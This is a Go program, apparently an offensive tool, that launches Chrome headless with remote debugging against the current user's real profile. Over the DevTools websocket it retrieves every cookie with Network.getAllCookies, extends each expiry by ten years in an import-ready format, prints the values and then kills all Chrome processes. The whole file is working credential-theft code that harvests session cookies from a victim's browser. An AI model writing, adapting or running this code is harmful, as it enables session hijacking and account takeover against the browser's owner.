package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"time"

	"golang.org/x/net/websocket"
)

// DebugData is JSON structure returned by Chromium
type DebugData struct {
	Description          string `json:"description"`
	DevtoolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	FaviconURL           string `json:"faviconUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	PageType             string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

// WebsocketResponseRoot is the raw response from Chromium websocket
type WebsocketResponseRoot struct {
	ID     int                     `json:"id"`
	Result WebsocketResponseNested `json:"result"`
}

// WebsocketResponseNested is the object within the the raw response from Chromium websocket
type WebsocketResponseNested struct {
	Cookies []Cookie `json:"cookies"`
}

// Cookie is JSON structure returned by Chromium websocket
type Cookie struct {
	Name     string  `json:"name"`
	Value    string  `json:"value"`
	Domain   string  `json:"domain"`
	Path     string  `json:"path"`
	Expires  float64 `json:"expires"`
	Size     int     `json:"size"`
	HTTPOnly bool    `json:"httpOnly"`
	Secure   bool    `json:"secure"`
	Session  bool    `json:"session"`
	SameSite string  `json:"sameSite"`
	Priority string  `json:"priority"`
}

// LightCookie is a JSON structure for the cookie with only the name, value, domain, path, and (modified) expires fields
type LightCookie struct {
	Name    string  `json:"name"`
	Value   string  `json:"value"`
	Domain  string  `json:"domain"`
	Path    string  `json:"path"`
	Expires float64 `json:"expirationDate"`
}

func main() {
	debugPort := "9999"

	err := startProcess()
	if err != nil {
		os.Exit(0)
	}

	debugList, err := getDebugData(debugPort)
	if err != nil {
		os.Exit(1)
	}

	err = dumpCookies(debugList)
	if err != nil {
		os.Exit(2)
	}

	terminateProcess()
	os.Exit(3)
}

// GetDebugData access the /json endpoint to retrieve debug data
func getDebugData(debugPort string) ([]DebugData, error) {
	var debugList []DebugData
	var debugURL = "http://localhost:" + debugPort + "/json"

	resp, err := http.Get(debugURL)
	if err != nil {
		return debugList, err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return debugList, err
	}
	err = json.Unmarshal(body, &debugList)
	if err != nil {
		return debugList, err
	}

	return debugList, nil
}

// DumpCookies interacts with the webSocketDebuggerUrl to obtain Chromium cookies
func dumpCookies(debugList []DebugData) error {
	var websocketURL = debugList[0].WebSocketDebuggerURL
	ws, err := websocket.Dial(websocketURL, "", "http://localhost/")
	if err != nil {
		return err
	}

	var message = "{\"id\": 1, \"method\":\"Network.getAllCookies\"}"
	websocket.Message.Send(ws, message)

	var rawResponse []byte
	websocket.Message.Receive(ws, &rawResponse)

	var websocketResponseRoot WebsocketResponseRoot
	err = json.Unmarshal(rawResponse, &websocketResponseRoot)
	if err != nil {
		return err
	}
	lightCookieList := []LightCookie{}

	for _, value := range websocketResponseRoot.Result.Cookies {
		// Turns Cookie into LightCookie with modified expires field
		var lightCookie LightCookie

		lightCookie.Name = value.Name
		lightCookie.Value = value.Value
		lightCookie.Domain = value.Domain
		lightCookie.Path = value.Path
		lightCookie.Expires = (float64)(time.Now().Unix() + (10 * 365 * 24 * 60 * 60))
		lightCookieList = append(lightCookieList, lightCookie)
	}

	for _, cookie := range lightCookieList {
		message := fmt.Sprintf(
			"Name: %s\nValue: %s\nDomain: %s\nPath: %s\nExpire: %f\n",
			cookie.Name,
			cookie.Value,
			cookie.Domain,
			cookie.Path,
			cookie.Expires,
		)
		fmt.Print(message)
	}
	return nil
}

// startProcess starts a new chrome browser in headless and debug mode
func startProcess() error {
	user, err := user.Current()
	if err != nil {
		return err
	}
	cmd := exec.Command("powershell.exe", "-c", `Start-Process "chrome.exe" -ArgumentList '--remote-debugging-port=9999 --headless --user-data-dir="`+user.HomeDir+`\AppData\Local\Google\Chrome\User Data"'`)
	if err := cmd.Run(); err != nil {
		return err
	}
	return nil
}

// terminateProcess kills the chrome process
func terminateProcess() error {
	cmd := exec.Command("powershell.exe", "-c", `Get-Process "chrome" | Stop-Process`)
	if err := cmd.Run(); err != nil {
		return err
	}
	return nil
}
